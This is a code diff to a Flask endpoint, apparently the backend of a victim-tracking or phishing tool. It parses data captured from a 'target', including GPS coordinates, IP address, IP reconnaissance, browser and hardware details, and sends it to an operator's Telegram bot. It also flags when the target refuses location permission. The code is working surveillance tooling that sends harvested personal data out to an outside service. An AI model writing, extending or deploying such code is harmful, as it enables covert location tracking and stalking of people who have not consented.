@@ -142,27 +142,111 @@ def update_location():
     data = request.json or {}
     chat_id = request.args.get('id', '')
     
-    print(f"{G}[+] {C}UPDATE_LOCATION_CALLED chat_id={chat_id} data={data}{W}")
+    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED chat_id={chat_id} data={data}{W}")
 
-    if chat_id in active_sessions:
+    if chat_id and chat_id in active_sessions:
         print(f"{G}[+] {C}Sending now...{W}")
-        # Send location data to Telegram
-        msg = f"🌍 *Location Captured*\n\n"
-        msg += f"📍 *Latitude*: `{data.get('lat', 'Unknown')}`\n"
-        msg += f"📍 *Longitude*: `{data.get('lon', 'Unknown')}`\n"
-        msg += f"🔍 *Accuracy*: `{data.get('accuracy', 'Unknown')}m`\n"
-        msg += f"📱 *Device*: `{data.get('platform', 'Unknown')} {data.get('browser', 'Unknown')}`\n"
-        msg += f"🌐 *IP*: `{data.get('ip', 'Unknown')}`\n"
         
-        if 'lat' in data and 'lon' in data:
-            # Also send map URL
-            map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
-            msg += f"\n[📌 View on Map]({map_url})"
+        # Process data based on content type
+        msg = ""
         
+        # Check if it's a system info payload
+        if 'embeds' in data and data['embeds'] and 'title' in data['embeds'][0] and data['embeds'][0]['title'] == 'Uagent:':
+            # System information
+            embed = data['embeds'][0]
+            description = embed['description']
+            
+            # Extract data from the description (this is rough parsing, might need adjustment)
+            platform_match = re.search(r'Platform: ([^\n]+)', description)
+            browser_match = re.search(r'Browser_Name: ([^\n]+)', description)
+            
+            msg = f"📱 *Device Information*\n\n"
+            if platform_match:
+                msg += f"💻 *Platform*: `{platform_match.group(1)}`\n"
+            if browser_match:
+                msg += f"🌐 *Browser*: `{browser_match.group(1)}`\n"
+                
+            # Extract more details as needed
+            ram_match = re.search(r'Ram: ([^\n]+)', description)
+            cpu_match = re.search(r'CPU_cores: ([^\n]+)', description)
+            if ram_match:
+                msg += f"🧠 *RAM*: `{ram_match.group(1)}GB`\n"
+            if cpu_match:
+                msg += f"⚙️ *CPU Cores*: `{cpu_match.group(1)}`\n"
+                
+        # Check if it's an IP payload
+        elif 'embeds' in data and data['embeds'] and 'author' in data['embeds'][0] and data['embeds'][0]['author']['name'] == 'Target Ip':
+            embed = data['embeds'][0]
+            description = embed['description']
+            
+            # Extract the IP from the description 
+            ip_match = re.search(r'```xl\n(.+?)```', description)
+            if ip_match:
+                ip = ip_match.group(1)
+                msg = f"🌐 *IP Address Captured*\n\n"
+                msg += f"📍 *IP*: `{ip}`\n\n"
+                msg += f"[🔍 View IP Details](https://ip-api.com/#{ip})"
+                
+        # Check if it's a location payload
+        elif 'embeds' in data and data['embeds'] and 'title' in data['embeds'][0] and data['embeds'][0]['title'] == 'GPS location of target..':
+            embed = data['embeds'][0]
+            description = embed['description']
+            
+            # Extract lat/long from description
+            lat_match = re.search(r'Latitude:([^\n]+)', description)
+            lon_match = re.search(r'Longitude:([^\n]+)', description)
+            
+            if lat_match and lon_match:
+                lat = lat_match.group(1).strip()
+                lon = lon_match.group(1).strip()
+                
+                msg = f"🌍 *Location Captured*\n\n"
+                msg += f"📍 *Latitude*: `{lat}`\n"
+                msg += f"📍 *Longitude*: `{lon}`\n"
+                
+                # Add map URL
+                map_url = f"https://www.google.com/maps/place/{lat},{lon}"
+                msg += f"\n[📌 View on Map]({map_url})"
+                
+        # If we have a structured IP recon payload
+        elif 'embeds' in data and data['embeds'] and 'author' in data['embeds'][0] and data['embeds'][0]['author']['name'] == 'IP Address Reconnaissance':
+            embed = data['embeds'][0]
+            description = embed['description']
+            
+            # Extract details
+            country_match = re.search(r'Country: ([^\n]+)', description)
+            city_match = re.search(r'City: ([^\n]+)', description)
+            isp_match = re.search(r'Isp: ([^\n]+)', description)
+            lat_match = re.search(r'Lat: ([^\n]+)', description)
+            lon_match = re.search(r'Lon: ([^\n]+)', description)
+            
+            msg = f"🔍 *IP Reconnaissance Results*\n\n"
+            
+            if country_match:
+                msg += f"🌐 *Country*: `{country_match.group(1)}`\n"
+            if city_match:
+                msg += f"🏙️ *City*: `{city_match.group(1)}`\n"
+            if isp_match:
+                msg += f"📡 *ISP*: `{isp_match.group(1)}`\n"
+                
+            if lat_match and lon_match:
+                lat = lat_match.group(1).strip()
+                lon = lon_match.group(1).strip()
+                map_url = f"https://www.google.com/maps?q={lat},{lon}"
+                msg += f"\n[📌 View on Map]({map_url})"
+                
+        # Permission denied case
+        elif 'content' in data and 'User denied the request for Geolocation' in data['content']:
+            msg = "❌ *Target denied location permission*"
+            
+        # Default case if we can't identify the data format
+        if not msg:
+            msg = "📡 *Data received from target*\n\nUnable to parse the specific format."
+            
         try:
             bot.send_message(chat_id, msg, parse_mode="Markdown")
         except Exception as e:
-            logging.error(f"Error sending location to Telegram: {e}")
+            logging.error(f"Error sending to Telegram: {e}")
     
     return "OK"
 
